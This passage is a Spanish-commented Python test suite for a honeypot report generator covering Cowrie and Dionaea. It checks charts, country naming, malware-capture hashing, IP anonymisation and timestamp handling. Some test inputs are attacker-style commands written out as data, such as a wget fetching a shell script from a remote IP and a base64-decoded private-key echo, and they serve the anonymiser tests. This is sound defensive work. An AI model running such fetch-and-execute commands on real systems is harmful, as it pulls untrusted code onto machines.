          "ip_pais.most_common(args.paises)" in fuente
          and "cmd_pais.most_common(15)" in fuente)
    # Las tres figuras de paises dicen a cuantos dejan fuera del dibujo: el
    # circulo, las barras de actividad y las de cada protocolo.
    check("las figuras dicen a cuantos paises dejan fuera",
          fuente.count("fuera_del_dibujo(") >= 4)
    # La explicacion va DEBAJO DEL TITULO y no al pie: al pie llega tarde,
    # cuando uno ya ha interpretado el grafico a su manera, y deja un hueco
    # blanco entre el titulo y la figura que parece un fallo.
    check("las figuras no llevan el texto al pie",
          "<figcaption>" not in fuente)
    # La lista de paises se reordena con CSS puro ---radios mas `order`---
    # y no con JavaScript. Lo importante no es el truco, es que el informe
    # sigue sin ejecutar nada: la comprobacion de "ni script" de arriba
    # tiene que seguir en verde CON el selector puesto.
    # Los tres esquemas se pueden filtrar por senuelo, tambien sin JS: se
    # dibujan las variantes y los radios ensenan una.
    # El cronograma sale siempre; los dos de paises solo con tablas de
    # geolocalizacion, y la suite corre a proposito sin ellas.
    # El apartado de protocolos: uno "todos" y luego uno por protocolo con
    # los paises que mas lo atacan. El numero de pestanas es variable, y por
    # eso las reglas del conmutador se generan por ID y no por nth-of-type.
    check("hay apartado de protocolos con su pestana de todos",
          "protos-todos" in texto)
    # Las pestanas por protocolo necesitan tablas de paises, y la suite
    # corre a proposito sin ellas. Lo que SI se comprueba es que la seccion
    # dice por que se ha quedado con un solo boton, en vez de parecer rota.
    # El reparto de protocolos va en PASTEL: son partes de un todo y son
    # cinco. Un pastel con quince trozos no distingue ninguno; con cinco que
    # suman el total, gana a unas barras.
    # NO se busca "<path d=": eso ataba la prueba al ORDEN de los
    # atributos y se puso roja al anadirle una clase al trozo, con el pastel
    # perfectamente dibujado. Se busca un <path> con un ARCO de verdad
    # ---"A" de arc en el atributo d---, que es lo que distingue un trozo de
    # pastel de un camino cualquiera: dice mas y no depende de como se
    # escriba la etiqueta.
    check("el reparto de protocolos va en pastel, con su leyenda",
          re.search(r'<path[^>]* d="M [^"]* A ', texto) is not None
          and "Telnet (puerto 23)" in texto)
    # El numero del parentesis es un PUERTO y se dice. Suelto se lee como
    # una cifra mas de las muchas que lleva el informe.
    check("y el protocolo dice que ese numero es un puerto",
          "Telnet (23)" not in texto and "SMB (puerto 445)" in texto)
    check("el porcentaje va dentro del trozo y el valor en la leyenda",
          re.search(r'fill="#fff">\d+%</text>', texto) is not None
          and "contactos (" in texto)
    # Un unico protocolo daria un arco degenerado ---inicio y fin en el
    # mismo punto--- y no se dibujaria nada. Ahi va un circulo.
    sys.path.insert(0, ANALISIS)
    import analisis as _an2
    check("un solo trozo se dibuja como circulo, no como arco vacio",
          "<circle" in _an2.svg_quesitos([("uno", 5)], "t", "x"))

    check("sin tablas de paises, se dice por que no hay pestanas por protocolo",
          "países atacan cada protocolo" in texto)
    # El puerto de la ETIQUETA es el publico. No vale mirar todo el
    # documento: "2222" aparece tambien en el texto que explica justamente
    # esta correccion.
    check("el puerto de la etiqueta es el PUBLICO, no el del contenedor",
          ">SSH (puerto 22)</text>" in texto
          and ">SSH (puerto 2222)</text>" not in texto)
    check("las reglas del conmutador se generan por id, no por nth-of-type",
          "#protos-todos:checked ~ .protos-v-todos" in texto
          and "nth-of-type" not in texto)

    check("el cronograma se puede filtrar por senuelo",
          all(x in texto for x in ("cuando-total", "cuando-cowrie",
                                   "cuando-dionaea")))
    check("y los de paises tambien, cuando hay tablas",
          all(x in fuente for x in ('conmutador("dedonde"',
                                    'conmutador("trabajo"')))
    # El total de la figura de actividad SUMA COSAS DISTINTAS ---ordenes de
    # Cowrie y conexiones de Dionaea, porque Dionaea no tiene shell--- y eso
    # solo vale si el lector ve de que esta hecha la cifra. La etiqueta de
    # cada barra lleva el desglose; sin el, la suma seria un numero opaco.
    check("el total de actividad ensena el desglose en cada barra",
          '= %s + %s · desde %s (los dos señuelos)' in fuente
          and 'nu(cmd_pais.get(c, 0), "órdenes en Cowrie")' in fuente
          and 'nu(conn_pais_dio.get(c, 0), "conexiones a Dionaea")' in fuente)
    # Y CADA CIFRA DICE DE DONDE SALE. "287.135 · 281.143 ord. + 5.992
    # conex. · 226 IPs" son cuatro numeros seguidos sin decir cual es cual
    # ni de que senuelo. El desglose va ademas en SU PROPIA LINEA: pegado
    # detras de la barra, el hueco de la derecha ---que sale de la etiqueta
    # mas larga--- encogia las barras hasta el minimo y la figura dejaba de
    # comparar nada.
    check("y cada cifra del desglose dice de que senuelo es",
          "(los dos señuelos)" in fuente
          and "órdenes en Cowrie · desde" in fuente
          and "conexiones a Dionaea · desde" in fuente)
    # LAS DOS LLAVES DE ARRIBA. La misma figura vale para tres cosas
    # distintas y al cambiar de pestana nada decia cual se esta mirando.
    check("las dos columnas van rotuladas, y el rotulo cambia por pestana",
          'columnas=("Países", "Actividad total, "' in fuente
          and '"Cowrie + Dionaea"' in fuente
          and '"solo Cowrie"' in fuente and '"solo Dionaea"' in fuente)
    # Un eje de tiempo con los dias vacios QUITADOS deja de ser un eje de
    # tiempo: "22, 23, 28, 29" hace que un hueco de cuatro dias parezca dos
    # barras vecinas. Pasaba con Dionaea, que estuvo cuatro dias sin anotar.
    import datetime as _dt
    sys.path.insert(0, ANALISIS)
    import analisis as _an
    _hueco = {_dt.date(2026, 8, 22): 5, _dt.date(2026, 8, 27): 9}
    igual("el cronograma rellena los dias vacios", 6,
          len(_an.rellena_dias(_hueco)))
    igual("y los rellena con cero, no inventando nada", 0,
          _an.rellena_dias(_hueco)[_dt.date(2026, 8, 24)])

    # NINGUN NOMBRE DE CLASE, ID O ATRIBUTO PUEDE LLEVAR TILDE.
    #
    # Al poner tildes en el texto del informe se colo una en un nombre de
    # clase: el marcado decia class="países" y la hoja de estilo .paises, asi
    # que NINGUNA regla casaba y la lista dejo de ordenarse. No se ve leyendo
    # el codigo ---la pagina sigue pintandose--- y el modo por defecto
    # disimulaba el fallo, porque el orden alfabetico es el que ya trae el
    # documento escrito. Solo se nota pulsando los otros dos botones.
    rotos = [m.group(0) for m in
             re.finditer(r'(class|id|for|name)="([^"]*)"', texto)
             if any(ord(ch) > 127 for ch in m.group(2))]
    igual("ningun atributo del marcado lleva tildes", [], rotos)
    # Y al reves: toda clase que se USA en el marcado tiene que tener regla
    # en la hoja. Asi se caza el renombrado en cualquiera de los dos lados,
    # y no depende de que la seccion que la usa se haya llegado a dibujar.
    hoja = re.search(r"<style>(.*?)</style>", texto, re.S).group(1)
    usadas = set()
    for m in re.finditer(r'class="([^"]+)"', texto):
        usadas.update(m.group(1).split())
    sin_regla = sorted(c for c in usadas if ("." + c) not in hoja)
    igual("toda clase del marcado tiene regla en la hoja", [], sin_regla)
    # Y LAS CLASES DE LOS GLOBOS, SOLO DENTRO DE LOS SVG.
    #
    # Esta no la caza la de arriba, porque la clase SI tenia regla: la tenia
    # de mas. Los globos nacieron como .s y .t, y el informe ya usaba .t
    # para las tarjetas del resumen, asi que ".t { opacity: 0 }" dejo
    # invisibles las diez cifras de cabecera ---las mas leidas del
    # documento--- sin romper nada ni dar un error.
    #
    # Al ser un solo fichero, el espacio de nombres del CSS es COMUN: una
    # clase nueva puede chocar con cualquier otra del informe. Se comprueba
    # que fuera de los <svg> no aparece ninguna de las tres.
    fuera_svg = re.sub("<svg.*?</svg>", "", texto, flags=re.S)
    usadas_fuera = set()
    for m in re.finditer('class="([^"]+)"', fuera_svg):
        usadas_fuera.update(m.group(1).split())
    choque = sorted(usadas_fuera & {"gf", "gg", "gtp"})
    igual("las clases de los globos no chocan con el resto del informe",
          [], choque)

    # Los nombres de pais salen de DOS fuentes: iso-codes (oficial, con
    # tildes) y nombres.txt (acortado a mano, sin ellas). Se quiere lo corto
    # y con tildes, y la regla que las mezcla es facil de romper.
    sys.path.insert(0, ANALISIS)
    import analisis as _an3
    _g = _an3.Geo(None)
    # LA GUARDA PREGUNTA POR iso-codes, NO POR "HAY ALGUN NOMBRE".
    #
    # Decia `_g.nombre("ES") != "ES"`, que no es lo mismo: nombres.txt esta
    # VERSIONADO, asi que siempre hay un nombre y la guarda nunca saltaba.
    # En una maquina con el paquete daba "Espana" != "ES" y pasaba de largo
    # ---parecia correcta---; en una sin el, devuelve "Espana" y las tres
    # comprobaciones de tilde fallan por el entorno y no por el codigo.
    #
    # Y se DICE cuando se salta. Una prueba que desaparece en silencio es
    # cobertura que se pierde sin que nadie se entere.
    # YA NO DEPENDE DE iso-codes. Los nombres salen de NOMBRES_PAISES, una
    # lista revisada a mano, porque con iso-codes el informe llevaba faltas
    # segun la maquina: "Espana" sin el paquete, y con el sus propias
    # erratas ("Costa de Marfil" con tilde en la i, "Algeria").
    igual("el nombre corto gana al oficial", "Rusia", _g.nombre("RU"))
    igual("los nombres llevan sus tildes", "España", _g.nombre("ES"))
    igual("los acortados tambien llevan tilde", "Irán", _g.nombre("IR"))
    igual("y se corrigen las erratas de iso-codes", "Costa de Marfil",
          _g.nombre("CI"))
    igual("   y los nombres que no son castellano", "Argelia", _g.nombre("DZ"))
    _cods = set()
    with open(os.path.join(REPO, "TELEGRAM SCRIPTS", "geoip", "nombres.txt"),
              encoding="utf-8") as _fh:
        for _l in _fh:
            if not _l.startswith("#") and " " in _l:
                _cods.add(_l.split(" ", 1)[0])
    igual("ningun codigo de nombres.txt se queda sin nombre revisado",
          [], sorted(_cods - set(_an3.NOMBRES_PAISES)))

    check("el selector de orden existe y trae los tres criterios",
          all(x in fuente for x in ("op-abc", "op-cmd", "op-ips")))
    # Lo que se destaca cambia con el orden: el nombre en el alfabetico y
    # la cifra correspondiente en los otros dos, siempre en la segunda
    # columna. Las dos cifras nacen iguales y discretas y se asciende la que
    # manda, que es lo que evita tener que deshacer estilos en cada modo.
    for regla in ("#op-abc:checked ~ .paises .nom { font-weight: 600",
                  "#op-ips:checked ~ .paises .c-ips { order: 2",
                  "#op-cmd:checked ~ .paises .c-cmd { order: 2"):
        check("destaca lo que ordena (%s)" % regla.split("{")[0].strip()[-14:],
              regla in texto)

    check("el alfabetico es el que viene marcado",
          '("abc", "Alfabético", " checked")' in fuente)
    # Ojo: se mira el INFORME, no el fuente. En el fuente hay un comentario
    # que menciona "<script src=..." para explicar por que no se usa.
    # YA NO BASTA CON QUE NO HAYA GUION: ahora hay uno. Lo que hay que
    # comprobar es que NO TOCA esto, o sea que la lista se sigue ordenando
    # con el guion desactivado. Se mira dentro del propio guion.
    guion = re.search("<script>(.*?)</script>", texto, re.S)
    check("y reordena con CSS, no con JavaScript",
          "order: var(--i)" in texto and guion is not None
          and not any(x in guion.group(1)
                      for x in ("paises", "op-", "order", "--i")))

    # --- El malware de Dionaea ----------------------------------------
    #
    # REGRESION: la primera version solo analizaba las capturas de Cowrie. En
    # el respaldo de verdad eran 1,4 GB de Dionaea contra 637 MB de Cowrie, o
    # sea que se quedaba fuera la mayor parte del malware, y ademas se
    # contaban como "ficheros que no aparecen en el log" de Cowrie, que es
    # otra cosa.
    check("las capturas salen con su SHA-256 calculado del fichero",
          "SHA-256 (calculado)" in texto)
    sha_a = hashlib.sha256(b"MZ\x90\x00 captura de mentira A").hexdigest()
    check("y el SHA-256 es el del fichero, no el del nombre",
          sha_a[:16] in texto)
    check("se cruza con el MD5 que guarda su base",
          hashlib.md5(b"MZ\x90\x00 captura de mentira A").hexdigest()[:12]
          in texto)
    # Se mira el CONTENIDO, no el nombre: el artefacto tiene nombre de
    # captura y aun asi no puede contarse como muestra.
    check("el auth.log del propio senuelo NO cuenta como muestra",
          ("no es una muestra" in texto or "no son muestras" in texto)
          and "Salida nuestra" in texto)
    check("y se dice que se ha mirado el contenido, no el nombre",
          "no el nombre" in texto)
    check("la muestra de verdad si sigue contando",
          "<td>ELF</td>" in texto or "<td>script</td>" in texto)

    check("las capturas de los dos senuelos van en la misma tabla",
          ">Dionaea<" in texto and ">Cowrie<" in texto)
    check("se dice cuantas veces se entrego cada binario",
          "Entregas" in texto)
    check("las capturas de Dionaea NO se cuentan como sobrantes de Cowrie",
          "captura(s) de Cowrie en disco" not in texto)

    # --- El orden de los apartados --------------------------------------
    #
    # Los limites delante de cualquier cifra, la metodologia al final. El
    # antiguo apartado 0 (un indice escrito a mano) ya no existe: repetia lo
    # que dice el indice desplegable y retrasaba los datos varias pantallas.
    h2s = re.findall(r"<h2[^>]*><span>(.*?)</span></h2>", texto)
    check("el primer apartado son los limites",
          bool(h2s) and h2s[0] == "1. Lo que este informe no puede saber")
    check("el ultimo es el anexo de las fuentes",
          bool(h2s) and h2s[-1] == "A. De dónde salen los datos")
    check("ya no hay apartado 0", not any(t.startswith("0.") for t in h2s))
    check("sin --conclusiones no hay apartado 9",
          not any(t.startswith("9.") for t in h2s))
    check("el aviso de lineas rotas va delante, no en el anexo",
          texto.find("no se han podido leer") < texto.find("A. De dónde")
          if "no se han podido leer" in texto else True)

    # --- Anonimizado ------------------------------------------------------
    #
    # Lo que importa no es que salga alguna etiqueta, sino que NO QUEDE
    # NINGUNA IP del respaldo, en ningun rincon: ni en las ordenes, ni en
    # las URLs, ni en los globos de las figuras.
    salida_a = os.path.join(BASE, "anonimizado.html")
    conc = os.path.join(BASE, "conclusiones.txt")
    with open(conc, "w", encoding="utf-8") as fh:
        fh.write("Primer párrafo <con> marcado.\n\nSegundo párrafo.\n")
    r = corre(raiz, salida_a, extra=("--anonimizar", "--ip-vps", "10.0.0.5",
                                     "192.0.2.10", "fe80::1",
                                     "--conclusiones", conc))
    igual("anonimizado: la herramienta termina bien", 0, r.returncode)
    anon = open(salida_a, encoding="utf-8").read() if not r.returncode else ""
    quedan = sorted(set(re.findall(r"(?:203\.0\.113|198\.51\.100|192\.0\.2)"
                                   r"\.\d+", anon)))
    igual("anonimizado: no queda ninguna IP del respaldo", [], quedan)
    reales = set(re.findall(r"(?:203\.0\.113|198\.51\.100)\.\d+(?!\d|/24)",
                            texto))
    etiq = set(re.findall(r"&lt;IP-[A-Z]{2}-\d{3}&gt;", anon))
    igual("anonimizado: una etiqueta por IP, ni mas ni menos",
          len(reales), len(etiq))
    check("anonimizado: la IP del señuelo sale como [IP VPS]",
          "[IP VPS]" in anon)
    check("anonimizado: lo dice arriba", "Informe anonimizado" in anon)
    check("anonimizado: sin la ruta del respaldo",
          BASE not in anon and BASE.replace("\\", "/") not in anon)
    check("anonimizado: los numeros de las tablas no cambian",
          re.sub(r"&lt;IP-[A-Z]{2}-\d{3}&gt;|\[IP VPS\]", "", anon).count(
              "<td") == anon.count("<td"))
    check("anonimizado: sin pregunta ni ruido en la salida de errores",
          "¿Anonimizar" not in r.stdout + r.stderr)
    h2a = re.findall(r"<h2[^>]*><span>(.*?)</span></h2>", anon)
    check("con --conclusiones sale el apartado 9, antes del anexo",
          "9. INFERIDO: conclusiones" in h2a
          and h2a.index("9. INFERIDO: conclusiones") == len(h2a) - 2)
    check("y el texto va escapado y en parrafos",
          "<p>Primer párrafo &lt;con&gt; marcado.</p>" in anon
          and "<p>Segundo párrafo.</p>" in anon)

    # Sin decir nada y sin nadie delante: se anonimiza, que es el lado
    # seguro del olvido.
    salida_d = os.path.join(BASE, "por-defecto.html")
    r = corre(raiz, salida_d, extra=())
    if r.returncode:
        print(r.stderr[-1500:])
    defecto = open(salida_d, encoding="utf-8").read() if not r.returncode else ""
    check("sin opcion y sin terminal, se anonimiza",
          "Informe anonimizado" in defecto and "203.0.113." not in defecto)

    import analisis as _an5
    _g = type("G", (), {"cc": lambda self, ip: "CN"})()
    for nombre, entrada, debe, no_debe in (
            ("la clave privada pierde el cuerpo",
             "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXk\n"
             "-----END OPENSSH PRIVATE KEY-----", "CLAVE PRIVADA OMITIDA",
             "b3BlbnNzaC1rZXk"),
            ("y tambien en base64",
             "echo LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K|base64 -d",
             "CLAVE PRIVADA OMITIDA", "LS0tLS1CRUdJTi"),
            ("una IP dentro de una URL", "wget http://45.9.1.2:8080/x.sh",
             "http://&lt;IP-CN-001&gt;:8080/x.sh", "45.9.1.2"),
            ("una IPv6 publica", "desde 2a01:4f8::1 entra",
             "&lt;IP-CN-001&gt;", "2a01:4f8"),
            ("una red /24", "203.0.113.0/24", "&lt;RED-CN-001&gt;/24",
             "203.0.113"),
            ("las privadas se quedan", "172.17.0.1 y 10.0.0.5",
             "172.17.0.1 y 10.0.0.5", "IP-"),
            ("una hora no es una IPv6", "a las 12:34:56", "12:34:56", "IP-"),
            ("ni una version con cinco numeros", "v1.2.3.4.5", "v1.2.3.4.5",
             "IP-")):
        hecho_ = _an5.anonimiza(entrada, _g, [])[0]
        check("anonimiza: " + nombre, debe in hecho_ and no_debe not in hecho_)
    check("anonimiza: la misma IP, la misma etiqueta",
          _an5.anonimiza("1.1.1.1 8.8.8.8 1.1.1.1", _g, [])[0]
          == "&lt;IP-CN-001&gt; &lt;IP-CN-002&gt; &lt;IP-CN-001&gt;")
    igual("sin_rutas deja solo el nombre",
          "analisis.py --respaldo resp --salida x.html",
          _an5.sin_rutas(r"C:\Users\Ana\ANALISIS\analisis.py --respaldo "
                         "/home/ana/resp --salida /mnt/c/x/x.html"))

    check("el informe no afirma familias de malware",
          not re.search(r"\b(mirai|redtail|xmrig)\b", texto, re.I))

    # --- El hash se recalcula -----------------------------------------
    raiz2 = os.path.join(BASE, "resp-corrupto")
    construye(raiz2, corrompe=True)
    salida2 = os.path.join(BASE, "informe2.html")
    corre(raiz2, salida2)
    t2 = open(salida2, encoding="utf-8").read()
    check("un fichero cuyo hash no cuadra se detecta y se dice",
          "no coincide con su nombre" in t2)

    raiz3 = os.path.join(BASE, "resp-sin-fichero")
    construye(raiz3, sin_fichero=True)
    salida3 = os.path.join(BASE, "informe3.html")
    corre(raiz3, salida3)
    t3 = open(salida3, encoding="utf-8").read()
    check("una muestra del log sin binario en el respaldo se dice",
          "cuyo fichero no está" in t3)

    # --- Un respaldo vacio no revienta --------------------------------
    vacio = os.path.join(BASE, "vacio")
    os.makedirs(vacio)
    salida4 = os.path.join(BASE, "informe4.html")
    r4 = corre(vacio, salida4)
    igual("un respaldo vacio no revienta, informa", 0, r4.returncode)
    t4 = open(salida4, encoding="utf-8").read()
    check("y dice que no estaba ninguna fuente", t4.count("NO ESTÁ") >= 5)
finally:
    shutil.rmtree(BASE, ignore_errors=True)

# =====================================================================
print()
print("== la hora, contra la funcion del recolector ==")
# Se EXTRAE del fichero del reporter en vez de copiarla aqui. Importarlo
# entero arrastraria el paquete (common.log, common.model...), y copiar la
# funcion seria probar la copia. Asi se prueba la de verdad.
fuente = os.path.join(REPO, "REPORTING PLATFORM SCRIPTS", "collectors",
                      "cowrie.py")
try:
    codigo = open(fuente, encoding="utf-8").read()
    trozo = re.search(r"^_CON_HUSO = .*?^def parse_timestamp.*?(?=^def )",
                      codigo, re.M | re.S)
    ns = {"datetime": datetime, "timezone": timezone, "re": re}
    exec(compile(trozo.group(0), fuente, "exec"), ns)      # noqa: S102
    suya = ns["parse_timestamp"]
except Exception as exc:                                   # noqa: BLE001
    suya = None
    print("  (no se pudo extraer la del recolector: %s)" % exc)

if suya:
    sys.path.insert(0, ANALISIS)
    import analisis                                        # noqa: E402

    from zoneinfo import ZoneInfo
    kyiv = ZoneInfo("Europe/Kyiv")
    casos = [
        "2026-09-01T10:00:00Z",          # "Z" mentirosa: es hora de Kyiv
        "2026-09-01T10:00:00",           # sin huso: igual
        "2026-09-01T10:00:00+03:00",     # desfase explicito: esa no miente
        "2026-01-15T23:59:59Z",          # invierno, que el desfase cambia
        "no es una fecha",
        "",
    ]
    distintos = [c for c in casos
                 if analisis.parse_timestamp(c, kyiv) != suya(c, kyiv)]
    igual("la correccion de hora da lo MISMO que la del recolector",
          [], distintos)
    igual("la 'Z' de Cowrie se reinterpreta como hora local",
          "2026-09-01 07:00",
          analisis.parse_timestamp(casos[0], kyiv).strftime("%Y-%m-%d %H:%M"))
    igual("un desfase explicito se respeta tal cual",
          "2026-09-01 07:00",
          analisis.parse_timestamp(casos[2], kyiv).strftime("%Y-%m-%d %H:%M"))

# =====================================================================
print()
print("== las duraciones, en la unidad en que se entienden ==")
sys.path.insert(0, ANALISIS)
import analisis as _an5
igual("menos de un segundo, en ms", "400 ms", _an5.dura(400))
igual("unos segundos, con coma", "4,2 s", _an5.dura(4200))
igual("mas de minuto y medio, en minutos", "2 min 0 s", _an5.dura(120000))
igual("y horas cuando son horas", "1 h 0 min", _an5.dura(3600000))

print()
print("== las tiras hexadecimales, en claro ==")
# Solo se descifra lo que sale ENTERO en texto imprimible: media palabra
# legible y media basura no es una lectura, es una suposicion.
igual("una tira imprimible se lee", "OVFUGZ",
      _an5.en_claro("\\x4f\\x56\\x46\\x55\\x47\\x5a"))
igual("y una de bytes de control no se inventa", "",
      _an5.en_claro("\\x00\\x01\\x02"))
igual("ni una a medias", "", _an5.en_claro("\\x41\\x42\\xff"))
check("la tira se reconoce dentro de una orden",
      _an5._RX_TIRA.findall("echo -e '\\x6b\\x61\\x6d\\x69'")
      == ["\\x6b\\x61\\x6d\\x69"])

print()
print("== lo que las figuras dicen de lo que NO ensenan ==")
# Las dos figuras del apartado 2 ensenan un recorte y ninguna lo decia:
#   - el cronograma agrupa por meses, y dos tramos pueden ser el periodo
#     entero o una muestra de uno mas largo. No es lo mismo al leer las
#     cifras y no se puede deducir de la figura.
#   - el circulo dibuja los N paises de arriba, no todos, asi que la cifra
#     del centro se lee como el total y no lo es: en el respaldo real son
#     24 triangulos de 151 paises.
#
# Se prueban las funciones directamente y no a traves del informe porque
# estas dos solo salen con las tablas de paises generadas, y la prueba
# corre a proposito con --geoip vacio.
sys.path.insert(0, ANALISIS)
import analisis as _an5

_circ = _an5.svg_circulo_triangulos([("ES", 5), ("FR", 3)], "IPs por país",
                                    "IPs", 10)
check("el centro dice la cifra y de cuantos paises es",
      ">8</tspan>" in _circ and "IPs usadas por 2 países" in _circ)
check("de cuantos paises hay en total",
      "de los 10 países en total" in _circ)
check("y cuantos no se dibujan", "por lo que no aparecen 8 países" in _circ)
# La cifra es la suma de los DIBUJADOS (5+3), no la de los diez paises: el
# centro de una figura dice lo que la figura ensena.
check("y la cifra es la de los dibujados, no la de todos",
      ">8</tspan>" in _circ)
# Si no sobra ninguno no hay nada que advertir, y decirlo seria ruido.
_circ2 = _an5.svg_circulo_triangulos([("ES", 5)], "IPs por país", "IPs", 1)
check("si se dibujan todos, no se habla de los que faltan",
      "no aparecen" not in _circ2 and "involucrados" not in _circ2)

# EL PASTEL Y LO QUE NO SE VE EN EL. MSSQL y RPC son el 0,1% cada uno: sus
# trozos miden menos de medio grado, asi que estaban dibujados pero en la
# figura no aparecian y el pastel ensenaba tres protocolos donde hay cinco.
# Lo que no llega al 1% se junta en un trozo gris y se amplia al lado.
_PROTO = [("Telnet", 487937), ("SMB", 207954), ("SSH", 107701),
          ("MSSQL", 915), ("RPC", 755)]
_pas = _an5.svg_quesitos(_PROTO, "Protocolos", "contactos")
check("lo diminuto se junta en un trozo con nombre",
      "Lo que no se ve: MSSQL y RPC (0,2%)" in _pas)
check("y se amplia al lado, dicho con su cifra", "ese 0,2% de cerca" in _pas)
check("diciendo que ahi las proporciones son entre ellos",
      "y cómo se reparte" in _pas)
# Los cinco siguen estando: el segundo pastel es una lupa, no un recorte.
igual("los cinco protocolos siguen dibujados", 6,
      _pas.count('class="gf gf'))   # 3 grandes + el gris + los 2 de la lupa
check("MSSQL sale con su valor de verdad, no con el del trozo gris",
      "MSSQL: 915 contactos (0,1%)" in _pas)
# EL COLOR ATA LOS DOS DIBUJOS. Si el segundo pastel repartiera colores por
# su propio orden, MSSQL seria azul en la lupa y verde en la leyenda.
igual("el color de cada protocolo es el mismo en los dos sitios", 3,
      _pas.count('fill="#2f8f5b"'))   # el cuadrito de la leyenda, el trozo
                                      # de la lupa y el cuadrito del globo
# Con uno solo no se amplia: un pastel de un trozo es un circulo que dice
# 100%, y eso no explica nada.
_uno = _an5.svg_quesitos([("SSH", 1000), ("RPC", 3)], "P", "contactos")
check("con un solo protocolo diminuto no se monta la lupa",
      "de cerca" not in _uno and "Lo que no se ve" not in _uno)
# En espanol el decimal va con coma; la leyenda ponia "60.6%".
check("los porcentajes van con coma", "(60,6%)" in _pas and "60.6" not in _pas)

_dias = {date(2026, 9, 1): 3, date(2026, 9, 2): 5}
_cr = _an5.svg_cronograma(_dias, "t", "u", pie="Todo el tiempo encendida")
check("el cronograma lleva su llave con el texto",
      "Todo el tiempo encendida" in _cr)
# La llave necesita sitio: sin crecer el lienzo, se pinta fuera del
# viewBox y no se ve, que es peor que no ponerla.
check("y la figura crece para que quepa", 'viewBox="0 0 860 380"' in _cr)
check("sin llave, la figura no crece",
      'viewBox="0 0 860 340"' in _an5.svg_cronograma(_dias, "t", "u"))

print()
print("== lo que el registro NO dice, y el informe tampoco debe decir ==")
# OJO: aqui arriba `fuente` ya no es el codigo ---se reutiliza mas abajo
# para la ruta del colector--- asi que el guion se lee otra vez.
codigo = open(GUION, encoding="utf-8").read()
# --- La entrada binaria no es una orden -------------------------------
#
# Por el telnet entra negociacion IAC y carga cruda, y Cowrie la anota en
# "input" igual que una linea tecleada. En el respaldo real son 31.360
# entradas: mezcladas con las demas, las primeras filas de "ordenes sin
# tecnica" eran un rombo repetido miles de veces, y ocupaban el sitio de lo
# que esa tabla existe para ensenar.
check("los bytes de control se escriben, no se tragan",
      _an5.visible("B\x004\x07") == "B\\x004\\x07")
check("y el texto normal no se toca",
      _an5.visible("wget http://x/a.sh") == "wget http://x/a.sh")
check("una orden con bytes de control es binaria",
      _an5.es_binaria("B\x004\x00\x00"))
# El rombo tambien, aunque el byte ya no se pueda recuperar: lo escribe
# COWRIE al decodificar con errors="replace" antes de anotar ---118.096
# veces en el respaldo real---, asi que cuando el informe lee el registro
# el byte original ya no existe en ningun sitio.
check("y una con el caracter de reemplazo, tambien",
      _an5.es_binaria("algo \ufffd raro"))
check("una orden de verdad no es binaria",
      not _an5.es_binaria("cat /proc/cpuinfo"))
# No basta con sacarlas de la tabla: el informe dice que "no cuentan como
# tecnica ni como orden sin mapear", y eso tiene que ser verdad. Un patron
# corto como "sh" casa dentro de cualquier chorro de bytes.
check("la entrada binaria tampoco cuenta como tecnica",
      "if es_binaria(c):" in codigo and codigo.count("continue") > 1)
check("y se dice cuantas son y donde se perdio el dato",
      "son órdenes" in codigo
      and "lo escribe Cowrie al decodificar" in codigo)

# --- Cero y "no hay" no son lo mismo ----------------------------------
#
# En este registro los eventos de login SOLO existen para SSH: 98.086
# fallidos y ni uno de telnet. Una fila de telnet con un 0 en esa columna
# dice "probo y no acerto", que es otra cosa que "aqui no se mide".
def fila_ip(ip):
    m = re.search(r"<tr>(?:(?!</tr>).)*<code>%s</code>.*?</tr>"
                  % re.escape(ip), texto, re.S)
    return m.group(0) if m else ""

check("la columna de logins dice que es de SSH",
      "Logins fallidos (SSH)" in texto)
check("y una IP que solo entro por telnet lleva un guion, no un cero",
      '">-</td>' in fila_ip("203.0.113.30") or "telnet" not in fila_ip("203.0.113.30"))
check("con su nota debajo de la tabla",
      "lleva un guion (-), y no un cero" in texto)

# --- Las dos figuras de paises no cuentan lo mismo --------------------
check("la tabla por pais dice que sus IPs son de Cowrie",
      '"IPs (Cowrie)"' in codigo and "son <b>solo de " in codigo)
# Y lo que no tiene pais no cabe en una figura que reparte por paises: sin
# decirlo, una diferencia legitima de una IP parece una errata.
check("y las figuras dicen cuanto se queda fuera por no tener pais",
      "No entran en la figura:</b> %s que la tabla " in codigo
      and "sinpais = max(0, todas - sum(mapa.values()))" in codigo)

# --- Ni rayas, ni comillas latinas, ni las faltas que ya hubo ------------
#
# El informe se ensena fuera, y el autor no quiere guiones largos ni medios
# ni comillas latinas o tipograficas: se usan comillas rectas. Se mira el
# HTML generado, que es lo que se lee, y no solo el codigo.
_prohibidos = ["\u2014", "\u2013", "\u00ab", "\u00bb", "\u201c", "\u201d",
               "\u201e", "&mdash;", "&ndash;", "&laquo;", "&raquo;",
               "&ldquo;", "&rdquo;"]
igual("el informe no lleva rayas ni comillas latinas o tipograficas", [],
      [c for c in _prohibidos if c in texto])
# Las faltas que tuvo, para que no vuelvan: cada una salia en el informe.
_faltas = ["seccion vacia", "se quedo a medias", "Alfabetico", "Ultima vez",
           "Tamano aproximado", "enganie", "anadir", "se metio", "es una campana",
           "ordenes mas", "habia tecleado", "Que es<", "esto si es malware",
           "Esta seccion", "ademas adivina", "que se toca por el lado",
           "Algeria", "Burquina", "Marfíl", "álisis.py</code>",
           "generar-tabla-países.py"]
igual("y no vuelven las faltas de ortografia que ya tuvo", [],
      [f for f in _faltas if f in texto])

# --- La hora, declarada una vez ---------------------------------------
#
# Todas las marcas van en UTC, pero eso solo se decia en la linea de
# "generado el ...", que habla de la hora de generacion. Una fecha sin huso
# en un informe que se lee en otro sitio no significa nada.
check("el informe declara en que huso van sus fechas",
      "Todas las fechas y horas de este informe van en </b>UTC" in texto
      or "van en "
      "UTC" in texto.replace("<b>", "").replace("</b>", ""))
check("y dice que la marca de Cowrie se corrige",
      "escribe la <b>hora local del contenedor</b>" in texto
      and "Europe/Kyiv" in texto)

print()
print("== la tabla de tecnicas ==")
filas, malas = 0, []
ids = set()
with open(TTP, encoding="utf-8") as fh:
    for n, linea in enumerate(fh, 1):
        linea = linea.rstrip("\n")
        if not linea.strip() or linea.lstrip().startswith("#"):
            continue
        campos = linea.split("\t")
        if len(campos) < 3:
            malas.append("linea %d: menos de tres columnas" % n)
            continue
        filas += 1
        ids.add(campos[0])
        if not re.fullmatch(r"T\d{4}(\.\d{3})?", campos[0]):
            malas.append("linea %d: '%s' no parece un id de ATT&CK" % (n, campos[0]))
        try:
            re.compile(campos[2])
        except re.error as exc:
